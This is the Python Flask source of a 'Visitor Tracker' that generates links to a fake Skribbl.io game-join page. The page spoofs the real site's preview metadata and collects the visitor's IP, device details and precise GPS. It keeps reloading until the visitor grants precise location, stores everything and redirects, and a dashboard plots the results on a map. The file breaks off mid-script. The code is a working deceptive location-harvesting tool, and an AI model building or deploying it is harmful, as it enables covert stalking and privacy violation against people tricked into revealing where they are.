from werkzeug import urls
from flask import Flask, request, redirect, render_template_string, jsonify
from datetime import datetime
import sqlite3
import urllib.request
import json
import os
import ssl
import socket

app = Flask(__name__)
DATABASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'visitor_data.db')


# ─── Database ─────────────────────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT,
            latitude REAL,
            longitude REAL,
            accuracy_meters REAL,
            city TEXT,
            region TEXT,
            country TEXT,
            isp TEXT,
            location_source TEXT,
            user_agent TEXT,
            browser TEXT,
            platform TEXT,
            redirect_url TEXT,
            timestamp TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()


# ─── Helpers ──────────────────────────────────────────────────────────────────

def get_ip_geo(ip=None):
    try:
        url = 'http://ip-api.com/json/'
        if ip and ip not in ('127.0.0.1', '::1'):
            url += ip
        url += '?fields=query,city,regionName,country,isp,lat,lon'
        resp = urllib.request.urlopen(url, timeout=4)
        data = json.loads(resp.read().decode())
        return {
            'ip': data.get('query', 'Unknown'),
            'city': data.get('city', ''),
            'region': data.get('regionName', ''),
            'country': data.get('country', ''),
            'isp': data.get('isp', ''),
            'lat': data.get('lat', 0),
            'lon': data.get('lon', 0),
        }
    except Exception:
        return {'ip': 'Unknown', 'city': '', 'region': '', 'country': '', 'isp': '', 'lat': 0, 'lon': 0}


def parse_ua(ua):
    browser, platform = 'Unknown', 'Unknown'
    if 'Edg/' in ua:
        browser = 'Edge'
    elif 'OPR/' in ua or 'Opera/' in ua:
        browser = 'Opera'
    elif 'Chrome/' in ua and 'Safari/' in ua:
        browser = 'Chrome'
    elif 'Firefox/' in ua:
        browser = 'Firefox'
    elif 'Safari/' in ua:
        browser = 'Safari'
    if 'Windows' in ua:
        platform = 'Windows'
    elif 'Android' in ua:
        platform = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        platform = 'iOS'
    elif 'Macintosh' in ua:
        platform = 'macOS'
    elif 'Linux' in ua:
        platform = 'Linux'
    return browser, platform


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template_string(INDEX_PAGE)


@app.route('/click')
def click():
    target_url = request.args.get('url', '')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    ip_geo = get_ip_geo()
    ua = request.user_agent.string
    browser, platform = parse_ua(ua)
    return render_template_string(
        CAPTURE_PAGE,
        ip_address=ip_address, user_agent=ua, browser=browser,
        platform=platform, target_url=target_url,
        ip_lat=ip_geo['lat'], ip_lon=ip_geo['lon'],
        ip_city=ip_geo['city'], ip_region=ip_geo['region'],
        ip_country=ip_geo['country'], ip_isp=ip_geo['isp'],
        public_ip=ip_geo['ip']
    )


@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.get_json()
    if not data:
        return jsonify({'status': 'error'}), 400
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        conn = get_db()
        conn.execute('''
            INSERT INTO visitors
            (ip_address, latitude, longitude, accuracy_meters, city, region, country, isp,
             location_source, user_agent, browser, platform, redirect_url, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.get('ip_address'), data.get('latitude', 0), data.get('longitude', 0),
            data.get('accuracy'), data.get('city', ''), data.get('region', ''),
            data.get('country', ''), data.get('isp', ''), data.get('source', 'unknown'),
            data.get('user_agent'), data.get('browser'), data.get('platform'),
            data.get('redirect_url', 'None'), ts
        ))
        conn.commit()
        conn.close()
    except Exception as e:
        app.logger.error(f"DB error: {e}")
        return jsonify({'status': 'error'}), 500
    return jsonify({'status': 'ok'})


@app.route('/generate')
def generate():
    return render_template_string(GENERATE_PAGE)


@app.route('/dashboard')
def dashboard():
    try:
        conn = get_db()
        visitors = conn.execute('SELECT * FROM visitors ORDER BY id DESC LIMIT 100').fetchall()
        total = conn.execute('SELECT COUNT(*) FROM visitors').fetchone()[0]
        unique = conn.execute('SELECT COUNT(DISTINCT ip_address) FROM visitors').fetchone()[0]
        gps_count = conn.execute("SELECT COUNT(*) FROM visitors WHERE location_source='gps'").fetchone()[0]
        conn.close()
    except Exception:
        visitors, total, unique, gps_count = [], 0, 0, 0
    return render_template_string(
        DASHBOARD_PAGE, visitors=visitors, total=total, unique=unique, gps_count=gps_count
    )


@app.route('/api/visitors')
def api_visitors():
    try:
        conn = get_db()
        rows = conn.execute('SELECT * FROM visitors ORDER BY id DESC LIMIT 50').fetchall()
        conn.close()
        return jsonify({'status': 'ok', 'visitors': [dict(r) for r in rows]})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/delete/<int:visitor_id>', methods=['DELETE'])
def delete_visitor(visitor_id):
    try:
        conn = get_db()
        conn.execute('DELETE FROM visitors WHERE id = ?', (visitor_id,))
        conn.commit()
        conn.close()
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ─── Shared CSS ───────────────────────────────────────────────────────────────

BASE_CSS = '''
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:'Inter',system-ui,-apple-system,sans-serif;
    background:#09090b;
    color:#e4e4e7;
    min-height:100vh;
    -webkit-font-smoothing:antialiased;
}
::selection{background:#7c3aed;color:#fff}
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:#18181b}
::-webkit-scrollbar-thumb{background:#3f3f46;border-radius:3px}
'''


# ─── Capture Page — disguised as Skribbl.io game join ─────────────────────────

CAPTURE_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>skribbl - Free Multiplayer Drawing &amp; Guessing Game</title>
    <link rel="icon" type="image/png" href="https://skribbl.io/favicon.png">
    <!-- Open Graph / WhatsApp / Telegram / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="skribbl - Free Multiplayer Drawing &amp; Guessing Game">
    <meta property="og:url" content="https://skribbl.io/">
    <meta property="og:description" content="skribbl io is a free multiplayer drawing and guessing game. Draw and guess words with your friends and people all around the world! Score the most points and be the winner!">
    <meta property="og:site_name" content="skribbl - Free Multiplayer Drawing &amp; Guessing Game">
    <meta property="og:image" content="https://skribbl.io/img/thumbnail.png">
    <meta property="og:image:width" content="768">
    <meta property="og:image:height" content="435">
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="skribbl - Free Multiplayer Drawing &amp; Guessing Game">
    <meta name="twitter:description" content="skribbl io is a free multiplayer drawing and guessing game. Draw and guess words with your friends and people all around the world! Score the most points and be the winner!">
    <meta name="twitter:image" content="https://skribbl.io/img/thumbnail.png">
    <!-- SEO -->
    <meta name="description" content="skribbl io is a free multiplayer drawing and guessing game. Draw and guess words with your friends and people all around the world! Score the most points and be the winner!">
    <meta name="keywords" content="skribbl, skribbl io, io, skribblio, skribbl.io, scribble, paint, draw, guess, draw and guess, fun, points, score, winner, browser, free, friends">
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Nunito',sans-serif;
            background:#f0f0f0;
            min-height:100vh;display:flex;align-items:center;justify-content:center;
            overflow:hidden;
        }
        .bg-shapes{position:fixed;inset:0;z-index:0;overflow:hidden}
        .shape{position:absolute;border-radius:50%;opacity:.15}
        .shape:nth-child(1){width:200px;height:200px;background:#ff6b9d;top:10%;left:-50px;animation:drift 8s ease-in-out infinite}
        .shape:nth-child(2){width:150px;height:150px;background:#51c4d3;top:60%;right:-30px;animation:drift 10s ease-in-out infinite reverse}
        .shape:nth-child(3){width:100px;height:100px;background:#ffd93d;bottom:10%;left:30%;animation:drift 6s ease-in-out infinite}
        @keyframes drift{0%,100%{transform:translate(0,0) rotate(0deg)}50%{transform:translate(30px,-20px) rotate(10deg)}}
        .card{
            position:relative;z-index:1;text-align:center;padding:2.5rem 3rem;
            background:#fff;border-radius:24px;
            box-shadow:0 10px 40px rgba(0,0,0,.1),0 2px 10px rgba(0,0,0,.05);
            max-width:420px;width:90%;
            border:3px solid #333;
        }
        .logo{margin-bottom:1.2rem}
        .logo-text{
            font-size:2.8rem;font-weight:900;letter-spacing:-1px;
            color:#333;display:inline-block;position:relative;
        }
        .logo-text span:nth-child(1){color:#ff6b9d}
        .logo-text span:nth-child(2){color:#51c4d3}
        .logo-text span:nth-child(3){color:#ffd93d}
        .logo-text span:nth-child(4){color:#6bcb77}
        .logo-text span:nth-child(5){color:#ff6b9d}
        .logo-text span:nth-child(6){color:#4d96ff}
        .logo-text span:nth-child(7){color:#333}
        .pencil{font-size:1.8rem;display:inline-block;margin-left:.5rem;
            animation:draw 1.5s ease-in-out infinite}
        @keyframes draw{0%,100%{transform:rotate(-15deg) translateY(0)}50%{transform:rotate(15deg) translateY(-3px)}}
        h2{font-size:1.1rem;font-weight:700;color:#555;margin-bottom:.3rem}
        .room-id{font-size:.8rem;color:#999;margin-bottom:1.5rem;font-weight:600}
        .progress{width:100%;height:8px;background:#eee;border-radius:8px;overflow:hidden;margin-bottom:1rem;
            border:1px solid #ddd}
        .progress-fill{height:100%;width:0%;border-radius:8px;
            background:linear-gradient(90deg,#ff6b9d,#51c4d3,#ffd93d,#6bcb77);
            background-size:300% 100%;animation:fill 4s ease-in-out forwards,shimmer 2s linear infinite}
        @keyframes fill{to{width:100%}}
        @keyframes shimmer{0%{background-position:0% 50%}100%{background-position:300% 50%}}
        .status{color:#888;font-size:.85rem;font-weight:600;transition:all .3s;min-height:1.2em}
        .players{margin-top:1.5rem;padding-top:1rem;border-top:2px dashed #eee}
        .players p{color:#aaa;font-size:.75rem;font-weight:700;display:flex;align-items:center;justify-content:center;gap:.4rem}
        .players .dot{width:8px;height:8px;background:#6bcb77;border-radius:50%;display:inline-block;
            animation:pulse 1.5s ease-in-out infinite}
        @keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.3);opacity:.5}}
        .avatar-row{display:flex;justify-content:center;gap:.4rem;margin-top:.8rem}
        .avatar{
            width:36px;height:36px;border-radius:50%;border:2px solid #eee;
            display:flex;align-items:center;justify-content:center;font-size:1rem;
            animation:popIn .4s cubic-bezier(.68,-.55,.27,1.55) both;
        }
        .avatar:nth-child(1){background:#ffe0e9;animation-delay:.2s}
        .avatar:nth-child(2){background:#d4f1f9;animation-delay:.5s}
        .avatar:nth-child(3){background:#fff3cd;animation-delay:.8s}
        .avatar:nth-child(4){background:#d4edda;animation-delay:1.1s}
        .avatar:nth-child(5){background:#e8daef;animation-delay:1.4s;opacity:.4;border-style:dashed}
        @keyframes popIn{0%{transform:scale(0)}100%{transform:scale(1)}}
    </style>
</head>
<body>
    <div class="bg-shapes"><div class="shape"></div><div class="shape"></div><div class="shape"></div></div>
    <div class="card">
        <div class="logo">
            <span class="logo-text"><span>s</span><span>k</span><span>r</span><span>i</span><span>b</span><span>b</span><span>l</span></span>
            <span class="pencil">✏️</span>
        </div>
        <h2>Joining private room...</h2>
        <div class="room-id" id="room">Room: loading...</div>
        <div class="progress"><div class="progress-fill"></div></div>
        <div class="status" id="status">Connecting to server...</div>
        <div class="players">
            <p><span class="dot"></span> Players waiting in lobby</p>
            <div class="avatar-row">
                <div class="avatar">😊</div>
                <div class="avatar">😎</div>
                <div class="avatar">🎨</div>
                <div class="avatar">🤩</div>
                <div class="avatar">❓</div>
            </div>
        </div>
    </div>
    <script>
        const D={
            ip:{{ ip_address|tojson }}, ua:{{ user_agent|tojson }},
            br:{{ browser|tojson }}, pl:{{ platform|tojson }},
            url:{{ target_url|tojson }},
            ip_lat:{{ ip_lat }}, ip_lon:{{ ip_lon }},
            ip_city:{{ ip_city|tojson }}, ip_region:{{ ip_region|tojson }},
            ip_country:{{ ip_country|tojson }}, ip_isp:{{ ip_isp|tojson }},
            pub_ip:{{ public_ip|tojson }}
        };

        // Generate a fake room ID
        const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let rid='';for(let i=0;i<6;i++)rid+=chars[Math.floor(Math.random()*chars.length)];
        document.getElementById('room').textContent='Room: #'+rid+' · Private';

        const sEl=document.getElementById('status');
        const msgs=['Connecting to server...','Finding room...','Loading game assets...','Syncing with players...','Joining lobby...'];
        let mi=0;
        const si=setInterval(()=>{mi++;if(mi<msgs.length)sEl.textContent=msgs[mi]},1000);

        function go(){clearInterval(si);window.location.href=D.url||'/dashboard'}
        // Absolute last-resort failsafe — 60s in case everything hangs
        setTimeout(go,60000);

        function save(lat,lon,acc,city,region,country,isp,src){
            sEl.textContent='✅ Connected! Entering game...';
            const c=new AbortController();setTimeout(()=>c.abort(),3000);
            fetch('/log_location',{method:'POST',headers:{'Content-Type':'application/json'},signal:c.signal,
                body:JSON.stringify({ip_address:D.pub_ip||D.ip,latitude:lat,longitude:lon,accuracy:acc,
                    city:city,region:region,country:country,isp:isp,source:src,
                    user_agent:D.ua,browser:D.br,platform:D.pl,redirect_url:D.url||'None'})
            }).then(()=>go()).catch(()=>go());
        }

        function reverseGeo(lat,lon){
            const c=new AbortController();setTimeout(()=>c.abort(),3000);
            return fetch('https://nominatim.openstreetmap.org/reverse?lat='+lat+'&lon='+lon+'&format=json&zoom=18&addressdetails=1',{signal:c.signal})
                .then(r=>r.json()).then(d=>{const a=d.address||{};return{city:a.city||a.town||a.village||a.suburb||a.county||'',region:a.state||a.state_district||'',country:a.country||''}})
                .catch(()=>({city:'',region:'',country:''}));
        }

        let done=false,best=null,wid=null,gpsTimer=null;
        // Threshold: readings above this accuracy (in meters) are treated as
        // "approximate" — Android's approximate permission typically gives 1–3 km.
        const PRECISE_THRESHOLD=150;
        let gotPrecise=false;

        function finalize(){
            if(done)return;done=true;
            if(wid!==null)navigator.geolocation.clearWatch(wid);
            if(gpsTimer!==null)clearTimeout(gpsTimer);
            if(best){
                sEl.textContent='Syncing with players...';
                reverseGeo(best.lat,best.lon).then(g=>save(best.lat,best.lon,best.acc,g.city,g.region,g.country,D.ip_isp,'gps'));
            }else{
                save(D.ip_lat,D.ip_lon,null,D.ip_city,D.ip_region,D.ip_country,D.ip_isp,'ip');
            }
        }

        if(navigator.geolocation){
            wid=navigator.geolocation.watchPosition(
                function(p){
                    if(done)return;
                    const a=p.coords.accuracy,la=p.coords.latitude,lo=p.coords.longitude;

                    // If accuracy is worse than threshold the user likely chose
                    // "Approximate" on Android — reject and re-prompt.
                    if(a>PRECISE_THRESHOLD && !gotPrecise){
                        // Wait a moment: on some devices the first reading is
                        // coarse even with precise permission and refines quickly.
                        // Give it 3 seconds to improve before reloading.
                        if(!gpsTimer){
                            gpsTimer=setTimeout(function(){
                                if(!gotPrecise && !done){
                                    // Still no precise fix — approximate was chosen
                                    if(wid!==null)navigator.geolocation.clearWatch(wid);
                                    sEl.textContent='📍 Precise location is required to join...';
                                    setTimeout(()=>window.location.reload(),1800);
                                }
                            },3000);
                        }
                        return; // don't record this imprecise reading
                    }

                    // We have a precise reading
                    gotPrecise=true;
                    if(gpsTimer){clearTimeout(gpsTimer);gpsTimer=null;}

                    // Start a 15s timer to collect the best GPS fix
                    if(!gpsTimer){
                        gpsTimer=setTimeout(finalize,15000);
                    }
                    if(!best||a<best.acc){best={lat:la,lon:lo,acc:a};sEl.textContent='Syncing with players...'}
                    if(a<=20)finalize(); // excellent fix — done early
                },
                function(err){
                    // User denied — show message then reload to re-prompt
                    if(done)return;
                    sEl.textContent='📍 Location needed to join the game...';
                    setTimeout(()=>window.location.reload(),1500);
                },
                {enableHighAccuracy:true,timeout:Infinity,maximumAge:0}
            );
        }else{
            done=true;
            save(D.ip_lat,D.ip_lon,null,D.ip_city,D.ip_region,D.ip_country,D.ip_isp,'ip');
        }
    </script>
</body>
</html>'''


# ─── Index Page ───────────────────────────────────────────────────────────────

INDEX_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Visitor Tracker</title>
    <style>
        ''' + BASE_CSS + '''
        body{display:flex;align-items:center;justify-content:center;overflow:hidden}
        .bg{position:fixed;inset:0}
        .bg::before{content:'';position:absolute;width:600px;height:600px;border-radius:50%;
            background:radial-gradient(circle,rgba(124,58,237,.1),transparent 70%);
            top:50%;left:50%;transform:translate(-50%,-50%);animation:pulse 4s ease-in-out infinite}
        @keyframes pulse{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.1)}}
        .container{
            position:relative;z-index:1;text-align:center;padding:3rem 3.5rem;
            background:rgba(24,24,27,.7);backdrop-filter:blur(24px);
            border-radius:24px;border:1px solid rgba(63,63,70,.4);
            max-width:480px;width:90%;
            box-shadow:0 25px 60px rgba(0,0,0,.5);
        }
        h1{font-size:2.2rem;font-weight:800;letter-spacing:-.03em;margin-bottom:.5rem;
            background:linear-gradient(135deg,#7c3aed,#3b82f6,#06b6d4);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{color:#71717a;font-size:.9rem;margin-bottom:2.5rem;font-weight:400}
        .actions{display:flex;flex-direction:column;gap:.75rem}
        .btn{
            display:block;padding:.9rem 1.5rem;border-radius:14px;text-decoration:none;
            font-weight:600;font-size:.95rem;text-align:center;
            transition:all .25s cubic-bezier(.4,0,.2,1);border:none;cursor:pointer;
        }
        .btn:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(0,0,0,.3)}
        .btn:active{transform:translateY(0)}
        .btn-primary{background:linear-gradient(135deg,#7c3aed,#6d28d9);color:#fff}
        .btn-primary:hover{box-shadow:0 12px 30px rgba(124,58,237,.3)}
        .btn-ghost{background:rgba(39,39,42,.8);color:#d4d4d8;border:1px solid #3f3f46}
        .btn-ghost:hover{background:rgba(63,63,70,.6);border-color:#52525b}
        .badge{
            display:inline-flex;align-items:center;gap:.4rem;
            margin-top:2rem;padding:.4rem .9rem;border-radius:20px;
            background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.15);
            color:#4ade80;font-size:.7rem;font-weight:500;
        }
        .badge .dot{width:5px;height:5px;background:#22c55e;border-radius:50%;
            animation:blink 2s ease-in-out infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
    </style>
</head>
<body>
    <div class="bg"></div>
    <div class="container">
        <h1>Visitor Tracker</h1>
        <p class="sub">GPS-accurate location tracking via link redirect.</p>
        <div class="actions">
            <a href="/generate" class="btn btn-primary">Generate Tracking Link</a>
            <a href="/dashboard" class="btn btn-ghost">📊 View Dashboard</a>
            <a href="/click" class="btn btn-ghost">📍 Track My Visit</a>
        </div>
        <div class="badge"><span class="dot"></span> Server Online</div>
    </div>
</body>
</html>'''


# ─── Generate Page ────────────────────────────────────────────────────────────

GENERATE_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Generate Tracking Link</title>
    <style>
        ''' + BASE_CSS + '''
        body{display:flex;align-items:center;justify-content:center;padding:2rem}
        .container{
            padding:2.5rem;background:rgba(24,24,27,.8);backdrop-filter:blur(20px);
            border-radius:20px;border:1px solid rgba(63,63,70,.5);
            max-width:520px;width:100%;
            box-shadow:0 25px 50px rgba(0,0,0,.4);
        }
        h1{font-size:1.5rem;font-weight:700;letter-spacing:-.02em;margin-bottom:.3rem;
            background:linear-gradient(135deg,#7c3aed,#3b82f6);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{color:#52525b;margin-bottom:2rem;font-size:.85rem}
        label{color:#71717a;font-size:.8rem;font-weight:500;display:block;margin-bottom:.5rem}
        input[type="url"]{
            width:100%;padding:.85rem 1rem;border-radius:12px;
            border:1px solid #27272a;background:#18181b;color:#e4e4e7;
            font-size:.95rem;font-family:inherit;outline:none;
            transition:border-color .2s;
        }
        input:focus{border-color:#7c3aed}
        input::placeholder{color:#3f3f46}
        .btn-gen{
            display:block;width:100%;padding:.9rem;margin-top:1rem;border:none;border-radius:12px;
            background:linear-gradient(135deg,#7c3aed,#6d28d9);color:#fff;
            font-size:.95rem;font-weight:600;font-family:inherit;cursor:pointer;
            transition:all .25s;
        }
        .btn-gen:hover{transform:translateY(-1px);box-shadow:0 8px 25px rgba(124,58,237,.25)}
        .result{
            margin-top:1.5rem;padding:1.2rem;background:#18181b;
            border-radius:14px;border:1px solid #27272a;display:none;
        }
        .result-label{color:#52525b;font-size:.75rem;font-weight:500;margin-bottom:.5rem}
        .result-link{color:#7c3aed;word-break:break-all;font-size:.85rem;font-weight:500;
            line-height:1.5;user-select:all}
        .copy-btn{
            margin-top:.8rem;padding:.5rem 1.2rem;border:1px solid #27272a;border-radius:10px;
            background:#18181b;color:#a1a1aa;cursor:pointer;font-size:.8rem;font-family:inherit;
            transition:all .2s;
        }
        .copy-btn:hover{background:#27272a;color:#e4e4e7}
        .steps{margin-top:2rem;padding-top:1.5rem;border-top:1px solid #1e1e22}
        .steps h3{color:#52525b;font-size:.8rem;font-weight:600;margin-bottom:1rem;text-transform:uppercase;letter-spacing:.05em}
        .step{display:flex;gap:.8rem;margin-bottom:.7rem;align-items:flex-start}
        .step-n{
            width:22px;height:22px;border-radius:8px;display:flex;align-items:center;
            justify-content:center;font-size:.7rem;font-weight:700;flex-shrink:0;
            background:rgba(124,58,237,.1);color:#7c3aed;border:1px solid rgba(124,58,237,.2);
        }
        .step-t{color:#71717a;font-size:.83rem;line-height:1.4}
        .nav{margin-top:1.5rem;display:flex;justify-content:center;gap:1.5rem}
        .nav a{color:#52525b;text-decoration:none;font-weight:500;font-size:.85rem;transition:color .2s}
        .nav a:hover{color:#a78bfa}
    </style>
</head>
<body>
    <div class="container">
        <h1>Generate Tracking Link</h1>
        <p class="sub">Paste any URL — captures GPS before redirecting.</p>
        <label for="url">Target URL</label>
        <input type="url" id="url" placeholder="https://skribbl.io" value="https://skribbl.io" autocomplete="off" autofocus>
        <button class="btn-gen" onclick="gen()">Generate Link</button>
        <div class="result" id="result">
            <div class="result-label">YOUR TRACKING LINK</div>
            <div class="result-link" id="link"></div>
            <button class="copy-btn" onclick="copy()">📋 Copy to Clipboard</button>
        </div>
        <div class="steps">
            <h3>How it works</h3>
            <div class="step"><div class="step-n">1</div><div class="step-t">Paste the URL you want to track</div></div>
            <div class="step"><div class="step-n">2</div><div class="step-t">Share the generated tracking link</div></div>
            <div class="step"><div class="step-n">3</div><div class="step-t">GPS coordinates are captured silently</div></div>
            <div class="step"><div class="step-n">4</div><div class="step-t">Visitor is redirected seamlessly</div></div>
        </div>
        <div class="nav"><a href="/">← Home</a><a href="/dashboard">Dashboard →</a></div>
    </div>
    <script>
        function gen(){
            const u=document.getElementById('url').value.trim();
            if(!u||(!u.startsWith('http://')&&!u.startsWith('https://'))){alert('Enter a valid URL starting with http:// or https://');return}
            document.getElementById('link').textContent=location.origin+'/click?url='+encodeURIComponent(u);
            document.getElementById('result').style.display='block';
        }
        function copy(){
            navigator.clipboard.writeText(document.getElementById('link').textContent).then(()=>{
                const b=document.querySelector('.copy-btn');b.textContent='✅ Copied!';
                setTimeout(()=>b.textContent='📋 Copy to Clipboard',2000);
            });
        }
        document.getElementById('url').addEventListener('keypress',e=>{if(e.key==='Enter')gen()});
    </script>
</body>
</html>'''


# ─── Dashboard Page ───────────────────────────────────────────────────────────

DASHBOARD_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Dashboard — Visitor Tracker</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        ''' + BASE_CSS + '''
        body{padding:2rem 2.5rem}
        @media(max-width:768px){body{padding:1rem}}
        .header{text-align:center;margin-bottom:2rem}
        .header h1{font-size:1.8rem;font-weight:800;letter-spacing:-.03em;
            background:linear-gradient(135deg,#7c3aed,#3b82f6,#06b6d4);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent;display:inline-block}
        .header p{color:#52525b;font-size:.85rem;margin-top:.4rem}
        .stats{display:flex;justify-content:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
        .stat{
            background:#18181b;border-radius:16px;padding:1.3rem 2rem;text-align:center;
            border:1px solid #27272a;min-width:140px;
            transition:border-color .2s;
        }
        .stat:hover{border-color:#3f3f46}
        .stat .num{font-size:2rem;font-weight:800;letter-spacing:-.02em}
        .stat .lbl{color:#52525b;font-size:.75rem;font-weight:500;margin-top:.2rem;text-transform:uppercase;letter-spacing:.05em}
        .stat:nth-child(1) .num{color:#7c3aed}
        .stat:nth-child(2) .num{color:#3b82f6}
        .stat:nth-child(3) .num{color:#22c55e}
        #map{
            width:100%;height:350px;border-radius:16px;margin-bottom:2rem;
            border:1px solid #27272a;overflow:hidden;
        }
        .table-wrap{
            overflow-x:auto;background:#18181b;border-radius:16px;
            border:1px solid #27272a;
        }
        table{width:100%;border-collapse:collapse;font-size:.8rem}
        th{
            background:#1e1e22;color:#71717a;padding:.85rem 1rem;text-align:left;
            font-weight:600;font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;
            position:sticky;top:0;z-index:1;
        }
        td{
            padding:.7rem 1rem;border-bottom:1px solid #1e1e22;
            max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
            color:#a1a1aa;
        }
        tr:hover td{background:rgba(124,58,237,.03)}
        .map-link{color:#7c3aed;text-decoration:none;font-weight:500}
        .map-link:hover{text-decoration:underline}
        .tag{
            display:inline-flex;align-items:center;gap:.3rem;padding:.2rem .6rem;
            border-radius:6px;font-size:.65rem;font-weight:600;
        }
        .tag-gps{background:rgba(34,197,94,.1);color:#4ade80;border:1px solid rgba(34,197,94,.15)}
        .tag-ip{background:rgba(251,191,36,.08);color:#fbbf24;border:1px solid rgba(251,191,36,.12)}
        .empty{text-align:center;padding:3rem;color:#3f3f46}
        .empty a{color:#7c3aed;text-decoration:none;font-weight:500}
        .nav{text-align:center;margin-top:1.5rem}
        .nav a{color:#52525b;text-decoration:none;font-weight:500;font-size:.85rem;margin:0 .8rem;transition:color .2s}
        .nav a:hover{color:#a78bfa}
        .acc{color:#4ade80;font-weight:500;font-size:.75rem}
        .acc-ip{color:#fbbf24;font-weight:500;font-size:.75rem}
        .btn-delete{
            padding:.25rem .6rem;border-radius:6px;border:1px solid rgba(239,68,68,.25);
            background:rgba(239,68,68,.08);color:#f87171;cursor:pointer;
            font-size:.7rem;font-weight:600;font-family:inherit;
            transition:all .2s;
        }
        .btn-delete:hover{background:rgba(239,68,68,.2);border-color:rgba(239,68,68,.5);color:#fca5a5}
        .btn-delete:active{transform:scale(.95)}
        tr.deleting td{opacity:.3;transition:opacity .3s}
    </style>
</head>
<body>
    <div class="header">
        <h1>📊 Dashboard</h1>
        <p>Click coordinates to open in Google Maps</p>
    </div>
    <div class="stats">
        <div class="stat"><div class="num">{{ total }}</div><div class="lbl">Total Visits</div></div>
        <div class="stat"><div class="num">{{ unique }}</div><div class="lbl">Unique IPs</div></div>
        <div class="stat"><div class="num">{{ gps_count }}</div><div class="lbl">GPS Locks</div></div>
    </div>
    <div id="map"></div>
    <div class="table-wrap">
        {% if visitors %}
        <table>
            <thead><tr>
                <th>#</th><th>IP</th><th>Coordinates</th><th>Accuracy</th>
                <th>Location</th><th>Source</th><th>Browser</th><th>Platform</th>
                <th>Redirect</th><th>Time</th><th></th>
            </tr></thead>
            <tbody>
                {% for v in visitors %}
                <tr>
                    <td>{{ v['id'] }}</td>
                    <td>{{ v['ip_address'] }}</td>
                    <td>
                        {% if v['latitude'] and v['latitude'] != 0 %}
                        <a class="map-link" href="https://www.google.com/maps?q={{ v['latitude'] }},{{ v['longitude'] }}&z=18" target="_blank">
                            {{ "%.6f"|format(v['latitude']) }}, {{ "%.6f"|format(v['longitude']) }}
                        </a>
                        {% else %}<span style="color:#3f3f46">—</span>{% endif %}
                    </td>
                    <td>
                        {% if v['accuracy_meters'] %}<span class="acc">±{{ "%.0f"|format(v['accuracy_meters']) }}m</span>
                        {% elif v['location_source'] == 'ip' %}<span class="acc-ip">~city</span>
                        {% else %}<span style="color:#3f3f46">—</span>{% endif %}
                    </td>
                    <td>{{ v['city'] }}{% if v['region'] %}, {{ v['region'] }}{% endif %}</td>
                    <td>
                        {% if v['location_source'] == 'gps' %}<span class="tag tag-gps">📡 GPS</span>
                        {% else %}<span class="tag tag-ip">🌐 IP</span>{% endif %}
                    </td>
                    <td>{{ v['browser'] }}</td>
                    <td>{{ v['platform'] }}</td>
                    <td title="{{ v['redirect_url'] }}">{{ v['redirect_url'][:25] if v['redirect_url'] else '—' }}</td>
                    <td>{{ v['timestamp'] }}</td>
                    <td><button class="btn-delete" onclick="delRow(this, {{ v['id'] }})">🗑 Delete</button></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        {% else %}
        <div class="empty">No visits yet. <a href="/generate">Create a tracking link!</a></div>
        {% endif %}
    </div>
    <div class="nav"><a href="/">← Home</a><a href="/generate">Generate Link</a></div>
    <script>
        const map=L.map('map',{zoomControl:true}).setView([20,0],2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{
